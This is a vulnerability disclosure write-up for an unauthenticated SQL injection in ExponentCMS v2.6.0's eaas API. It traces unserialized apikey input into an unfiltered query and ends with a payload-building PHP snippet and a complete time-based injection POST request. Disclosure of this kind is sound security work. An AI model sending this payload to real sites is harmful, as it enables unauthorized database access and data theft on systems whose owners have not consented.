# Vulnerability Info
## Vulnerability Type 
  ExponentCMS unauthticate sql injection
## Vulnerability Version 
  v2.6.0
## Recurring environment
  * Windows 10* PHP 5.4.5* Apache 2.4.23
## Author
 pang0lin@webray.com.cn inc.
# Vulnerability Description AND recurrence:

1. The security issue is occured at file \framework\modules\eaas\controllers\eaasController.php
The line number nearby 76.
   ```
   public function api() {
        if (empty($this->params['apikey'])) {
            $_REQUEST['apikey'] = true;  // set this to force an ajax reply
            $ar = new expAjaxReply(550, 'Permission Denied', 'You need an API key in order to access Exponent as a Service', null);
            $ar->send();  //FIXME this doesn't seem to work correctly in this scenario
        } else {
            $key = expUnserialize(base64_decode(urldecode($this->params['apikey'])));  //step 1
            if (is_object($key) && $key->mod === "eaas") {
                preg_match('/[a-zA-Z0-9_@]*/', $key->src, $matches);
                $key->src = $matches[0];
                // var_dump($key);
                $cfg = new expConfig($key); // step 2
                $this->config = $cfg->config;
                $cfg = new expConfig($key);
                $this->config = $cfg->config;
            }
            if(empty($cfg->id)) {
                $ar = new expAjaxReply(550, 'Permission Denied', 'Incorrect API key or Exponent as a Service module configuration missing', null);
                $ar->send();
            } else {
                if (!empty($this->params['get'])) {
                    $this->handleRequest();
                } else {
                    $ar = new expAjaxReply(200, 'ok', 'Your API key is working, no data requested', null);
                    $ar->send();
                }
            }
        }
    }
    ```
****
2. We can see issue with steps.
step 1. The user's input apikey can be decoded with  base64 and serilized.

step 2. The key goes into class of 'expConfig'. we try to find the definition.
```
    class expConfig extends expRecord {
	protected $table = 'expConfigs';

	function __construct($params=null) {
		global $db;

        if (!is_array($params)) {
            $this->location_data = serialize($params);
            parent::__construct($db->selectValue($this->table, 'id', "location_data='".$this->location_data."'"));  //step 3
        } else {
            parent::__construct($params);
        }

		// treat the loc data like an id - if the location data come thru as an object we need to look up the record
            //         if (!empty($params->src)) {
            //             echo "1";
            //             // if we hav a src, ie this controller has sources
            // parent::__construct($db->selectValue($this->table, 'id', "location_data='".$this->location_data."'"));
            //         } else {
            //             echo "2";
            //             // if we don't have a sourced controller, might still have a config for it.
            // parent::__construct($db->selectValue($this->table, 'id'));
            //}
		$this->config = expUnserialize($this->config);
        if (!is_array($this->config)) {
            $this->config = array();
        }
        // now to artificially attach any file objects to the config
        if (!empty($this->config['expFile'])) {
            foreach ($this->config['expFile'] as $type=>$file) {
                if (is_array($file)) foreach ($file as $key=>$filenum) {
                    if (is_numeric($filenum)) {
                        $this->config['expFile'][$type][$key] = new expFile($filenum);
                    } elseif (!is_object($filenum)) {
                        unset($this->config['expFile'][$type][$key]);
                    }
                }
            }
        }
	}
```
 ****
 3. At step 3. We can see the variable '$this->location_data' derectly use by function 'selectValue' without any filter.Try to find the definition.
 ```	
 	/**
	 * @param  $table
	 * @param  $col
	 * @param null $where
	 * @return null
	 */
    function selectValue($table, $col, $where=null) {
        if ($where == null)
            $where = "1";
        $sql = "SELECT " . $col . " FROM `" . $this->prefix . "$table` WHERE $where LIMIT 0,1";  //step 4
   
        $res = @mysqli_query($this->connection, $sql);

        if ($res == null)
            return null;
        $obj = mysqli_fetch_object($res);
        if (is_object($obj)) {
            return $obj->$col;
        } else {
            return null;
        }
    }
```
4. Now. it's clearly to understand the issue.
The user input is like .
$a = new eaasController();$a->mod = 'eaas';$a->src="aaaaaabbbb";$a->abc="1' union select sleep(5) -- a";var_dump(urlencode(base64_encode(serialize($a))));
then, we can use this payload to test if the target is vulnerable. If the target is vulnerable, the request will use more than 10s.
```
POST /index.php HTTP/1.1
Host: exponentcms.org

controller=eaas&action=api&get=photos&apikey=TzoxNDoiZWFhc0NvbnRyb2xsZXIiOjI4OntzOjExOiJ1c2VyYWN0aW9ucyI7YToxOntzOjc6InNob3dhbGwiO3M6MTk6Ikluc3RhbGwgU2VydmljZSBBUEkiO31zOjE0OiJyZW1vdmVfY29uZmlncyI7YToxMDp7aTowO3M6MTE6ImFnZ3JlZ2F0aW9uIjtpOjE7czoxMDoiY2F0ZWdvcmllcyI7aToyO3M6ODoiY29tbWVudHMiO2k6MztzOjc6ImVhbGVydHMiO2k6NDtzOjg6ImZhY2Vib29rIjtpOjU7czo1OiJmaWxlcyI7aTo2O3M6MTA6InBhZ2luYXRpb24iO2k6NztzOjM6InJzcyI7aTo4O3M6NDoidGFncyI7aTo5O3M6NzoidHdpdHRlciI7fXM6NDoidGFicyI7YTo3OntzOjc6ImFib3V0dXMiO3M6ODoiQWJvdXQgVXMiO3M6NDoiYmxvZyI7czo0OiJCbG9nIjtzOjU6InBob3RvIjtzOjY6IlBob3RvcyI7czo1OiJtZWRpYSI7czo1OiJNZWRpYSI7czo1OiJldmVudCI7czo2OiJFdmVudHMiO3M6MTI6ImZpbGVkb3dubG9hZCI7czoxNDoiRmlsZSBEb3dubG9hZHMiO3M6NDoibmV3cyI7czo0OiJOZXdzIjt9czo3OiIAKgBkYXRhIjthOjA6e31zOjEyOiIAKgBjbGFzc25hbWUiO3M6MTQ6ImVhYXNDb250cm9sbGVyIjtzOjEzOiJiYXNlY2xhc3NuYW1lIjtzOjQ6ImVhYXMiO3M6OToiY2xhc3NpbmZvIjtOO3M6MTQ6ImJhc2Vtb2RlbF9uYW1lIjtzOjk6ImV4cFJlY29yZCI7czoxMToibW9kZWxfdGFibGUiO047czoxNDoiACoAcGVybWlzc2lvbnMiO2E6NTp7czo2OiJtYW5hZ2UiO3M6NjoiTWFuYWdlIjtzOjk6ImNvbmZpZ3VyZSI7czo5OiJDb25maWd1cmUiO3M6NjoiY3JlYXRlIjtzOjY6IkNyZWF0ZSI7czo0OiJlZGl0IjtzOjQ6IkVkaXQiO3M6NjoiZGVsZXRlIjtzOjY6IkRlbGV0ZSI7fXM6MTY6IgAqAG1fcGVybWlzc2lvbnMiO2E6Njp7czo4OiJhY3RpdmF0ZSI7czo4OiJBY3RpdmF0ZSI7czo3OiJhcHByb3ZlIjtzOjc6IkFwcHJvdmUiO3M6NToibWVyZ2UiO3M6NToiTWVyZ2UiO3M6NjoicmVyYW5rIjtzOjY6IlJlUmFuayI7czo2OiJpbXBvcnQiO3M6MTI6IkltcG9ydCBJdGVtcyI7czo2OiJleHBvcnQiO3M6MTI6IkV4cG9ydCBJdGVtcyI7fXM6MjE6IgAqAHJlbW92ZV9wZXJtaXNzaW9ucyI7YTowOnt9czoxODoiACoAYWRkX3Blcm1pc3Npb25zIjthOjA6e31zOjIxOiIAKgBtYW5hZ2VfcGVybWlzc2lvbnMiO2E6MDp7fXM6MTQ6InJlcXVpcmVzX2xvZ2luIjthOjA6e31zOjg6ImZpbGVwYXRoIjtzOjgwOiIvcGhwc3R1ZHlfcHJvL1dXVy9leHBvbmVudC9mcmFtZXdvcmsvbW9kdWxlcy9lYWFzL2NvbnRyb2xsZXJzL2VhYXNDb250cm9sbGVyLnBocCI7czo4OiJ2aWV3cGF0aCI7czo2MDoiL3BocHN0dWR5X3Byby9XV1cvZXhwb25lbnQvZnJhbWV3b3JrL21vZHVsZXMvZWFhcy92aWV3cy9lYWFzIjtzOjE3OiJyZWxhdGl2ZV92aWV3cGF0aCI7czoxNToiZWFhcy92aWV3cy9lYWFzIjtzOjEwOiJhc3NldF9wYXRoIjtzOjQwOiIvZXhwb25lbnQvZnJhbWV3b3JrL21vZHVsZXMvZWFhcy9hc3NldHMvIjtzOjY6ImNvbmZpZyI7YTowOnt9czo2OiJwYXJhbXMiO2E6MDp7fXM6MzoibG9jIjtPOjg6InN0ZENsYXNzIjozOntzOjM6Im1vZCI7czo0OiJlYWFzIjtzOjM6InNyYyI7czowOiIiO3M6MzoiaW50IjtzOjA6IiI7fXM6MTE6ImNvZGVxdWFsaXR5IjtzOjY6InN0YWJsZSI7czoxNDoicnNzX2lzX3BvZGNhc3QiO2I6MDtzOjQ6ImVhYXMiO086OToiZXhwUmVjb3JkIjoyMzp7czoxMjoiACoAY2xhc3NpbmZvIjtOO3M6OToiY2xhc3NuYW1lIjtzOjk6ImV4cFJlY29yZCI7czo5OiJ0YWJsZW5hbWUiO3M6OToiZXhwUmVjb3JkIjtzOjEwOiJpZGVudGlmaWVyIjtzOjI6ImlkIjtzOjEzOiJyYW5rX2J5X2ZpZWxkIjtzOjA6IiI7czoxMjoiZ3JvdXBpbmdfc3FsIjtzOjA6IiI7czoxOToiaGFzX2V4dGVuZGVkX2ZpZWxkcyI7YTowOnt9czo3OiJoYXNfb25lIjthOjA6e31zOjg6Imhhc19tYW55IjthOjA6e31zOjEzOiJoYXNfbWFueV9zZWxmIjthOjA6e31zOjIzOiJoYXNfYW5kX2JlbG9uZ3NfdG9fbWFueSI7YTowOnt9czoyMzoiaGFzX2FuZF9iZWxvbmdzX3RvX3NlbGYiO2E6MDp7fXM6MTg6ImRlZmF1bHRfc29ydF9maWVsZCI7czowOiIiO3M6MjI6ImRlZmF1bHRfc29ydF9kaXJlY3Rpb24iO3M6MDoiIjtzOjEzOiJnZXRfYXNzb2NfZm9yIjthOjA6e31zOjI0OiIAKgBhdHRhY2hhYmxlX2l0ZW1fdHlwZXMiO2E6MDp7fXM6MjQ6ImF0dGFjaGFibGVfaXRlbXNfdG9fc2F2ZSI7TjtzOjE4OiJnZXRfYXR0YWNoYWJsZV9mb3IiO2E6MDp7fXM6ODoidmFsaWRhdGUiO2E6MDp7fXM6OToidmFsaWRhdGVzIjthOjA6e31zOjE1OiJkb19ub3RfdmFsaWRhdGUiO2E6MDp7fXM6MTg6InN1cHBvcnRzX3JldmlzaW9ucyI7YjowO3M6MTQ6Im5lZWRzX2FwcHJvdmFsIjtiOjA7fXM6MzoibW9kIjtzOjQ6ImVhYXMiO3M6Mzoic3JjIjtzOjEwOiJhYWFhYWFiYmJiIjtzOjM6ImFiYyI7czoyOToiMScgdW5pb24gc2VsZWN0IHNsZWVwKDUpIC0tIGEiO30%3D
```
